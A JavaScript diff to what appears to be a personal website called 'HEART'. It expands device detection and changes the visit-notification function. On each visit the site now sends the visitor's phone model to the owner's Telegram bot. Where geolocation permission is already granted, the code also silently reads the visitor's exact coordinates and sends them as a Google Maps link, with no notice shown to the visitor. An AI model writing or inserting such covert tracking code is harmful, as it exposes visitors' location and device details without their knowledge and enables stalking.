@@ -2992,6 +2992,36 @@ function initWeather() {
     });
 }
 
+const DEVICE_MODEL_MAP = {
+    // Samsung
+    'SM-S928B': 'Samsung Galaxy S24 Ultra',
+    'SM-S918B': 'Samsung Galaxy S23 Ultra',
+    'SM-S908E': 'Samsung Galaxy S22 Ultra',
+    'SM-G998B': 'Samsung Galaxy S21 Ultra',
+    'SM-A736B': 'Samsung Galaxy A73 5G',
+    'SM-A576B' : 'Samsung Galaxy A57 5G',
+    'SM-A546E': 'Samsung Galaxy A54',
+    'SM-A536E': 'Samsung Galaxy A53 5G',
+    'SM-A525F': 'Samsung Galaxy A52',
+    'SM-A155F': 'Samsung Galaxy A15',
+    'SM-M546B': 'Samsung Galaxy M54',
+
+    // Xiaomi / Redmi / POCO
+    '21091116I': 'Xiaomi 11T Pro',
+    '2312DRA50G': 'Redmi Note 13 Pro 5G',
+    '23117RA68G' : 'Redmi Note 13 Pro 4G',
+    '23021RAA2Y': 'Redmi Note 12 4G',
+    '22011211G': 'Redmi Note 11 Pro+ 5G',
+    '2201117TG': 'Redmi Note 11 Pro 4G',
+    'M2101K6G': 'POCO F3',
+
+    // OPPO
+    'CPH2525': 'OPPO Reno11 F 5G',
+    'CPH2457': 'OPPO Reno8 Pro 5G',
+    'CPH2359': 'OPPO Reno8 T 4G',
+    'CPH2387': 'OPPO A77s',
+};
+
 async function getSimplifiedDeviceInfo() {
     const ua = navigator.userAgent;
     let os = 'Không rõ';
@@ -3005,7 +3035,8 @@ async function getSimplifiedDeviceInfo() {
         if (/Windows/i.test(ua)) os = 'Windows';
         else if (/Macintosh|Mac OS X/i.test(ua)) os = 'macOS';
         else if (/Android/i.test(ua)) os = 'Android';
-        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+        else if (/iPhone/i.test(ua)) { os = 'iOS'; model = 'iPhone'; }
+        else if (/iPad/i.test(ua)) { os = 'iOS'; model = 'iPad'; }
         else if (/Linux/i.test(ua)) os = 'Linux';
 
         if (/Mobi|Android|iPhone/i.test(ua)) deviceType = 'Điện thoại';
@@ -3023,35 +3054,11 @@ async function getSimplifiedDeviceInfo() {
     if (!model && /Android/i.test(ua)) {
         const match = ua.match(/;\s?([^;]+?)\s?(Build|;|\))/);
         if (match && match[1]) model = match[1];
+
+        if (model && /android/i.test(model)) {
+            model = '';
+        }
     }
-
-    const DEVICE_MODEL_MAP = {
-        // Samsung
-        'SM-S928B': 'Samsung Galaxy S24 Ultra',
-        'SM-S918B': 'Samsung Galaxy S23 Ultra',
-        'SM-S908E': 'Samsung Galaxy S22 Ultra',
-        'SM-G998B': 'Samsung Galaxy S21 Ultra',
-        'SM-A546E': 'Samsung Galaxy A54',
-        'SM-A536E': 'Samsung Galaxy A53 5G',
-        'SM-A525F': 'Samsung Galaxy A52',
-        'SM-A736B': 'Samsung Galaxy A73 5G',
-        'SM-M546B': 'Samsung Galaxy M54',
-
-        // Xiaomi / Redmi / POCO
-        '21091116I': 'Xiaomi 11T Pro',
-        '2312DRA50G': 'Redmi Note 13 Pro 5G',
-        '23117RA68G' : 'Redmi Note 13 Pro 4G',
-        '23021RAA2Y': 'Redmi Note 12 4G',
-        '22011211G': 'Redmi Note 11 Pro+ 5G',
-        '2201117TG': 'Redmi Note 11 Pro 4G',
-        'M2101K6G': 'POCO F3',
-
-        // OPPO
-        'CPH2525': 'OPPO Reno11 F 5G',
-        'CPH2457': 'OPPO Reno8 Pro 5G',
-        'CPH2359': 'OPPO Reno8 T 4G',
-        'CPH2387': 'OPPO A77s',
-    };
 
     const commercialName = DEVICE_MODEL_MAP[model.trim()];
     if (commercialName) model = commercialName;
@@ -3071,17 +3078,49 @@ async function sendVisitNotification() {
 
         if (!botToken || !chatId) throw new Error("Tệp cấu hình bot không hợp lệ.");
 
+        let visitorDetails = [];
         const deviceInfo = await getSimplifiedDeviceInfo();
-        const visitorDetails = `Thiết bị: ${deviceInfo}`;
+        visitorDetails.push(`- Thiết bị: ${deviceInfo}`);
 
-        const message = `❤️ Ai đó vừa ghé thăm HEART! ❤️\n\n${visitorDetails}\n\n[${new Date().toLocaleString('vi-VN')}]`;
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const addLocationToDetails = (position) => {
+            const { latitude, longitude } = position.coords;
+            const locationInfo = [
+                `- Vị trí: <a href="https://www.google.com/maps?q=${latitude},${longitude}">Xem trên bản đồ</a>`
+            ];
+            visitorDetails.unshift(...locationInfo);
+        };
 
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: message }),
-        });
+        const finalizeAndSendMessage = () => {
+            const messageTitle = '❤️ Ai đó vừa ghé thăm HEART! ❤️';
+
+            const message = `${messageTitle}\n\n${visitorDetails.join('\n')}\n\n[${new Date().toLocaleString('vi-VN')}]`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
+            }).catch(err => console.error("Lỗi gửi tin nhắn Telegram:", err));
+        };
+
+        if (navigator.geolocation && navigator.permissions) {
+            navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
+                if (permissionStatus.state === 'granted') {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            addLocationToDetails(position);
+                            finalizeAndSendMessage();
+                        },
+                        () => finalizeAndSendMessage(),
+                        { timeout: 5000 }
+                    );
+                } else {
+                    finalizeAndSendMessage();
+                }
+            });
+        } else {
+            finalizeAndSendMessage();
+        }
     } catch (error) {
         console.error("Lỗi nghiêm trọng khi gửi thông báo:", error);
         if (botToken && chatId) {
@@ -3089,7 +3128,7 @@ async function sendVisitNotification() {
             await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: `⚠️ Lỗi gửi thông báo: ${error.message}` }),
+                body: JSON.stringify({ chat_id: chatId, text: `⚠️ Lỗi gửi thông báo: ${error.message}`, parse_mode: 'HTML' }),
             });
         }
     }
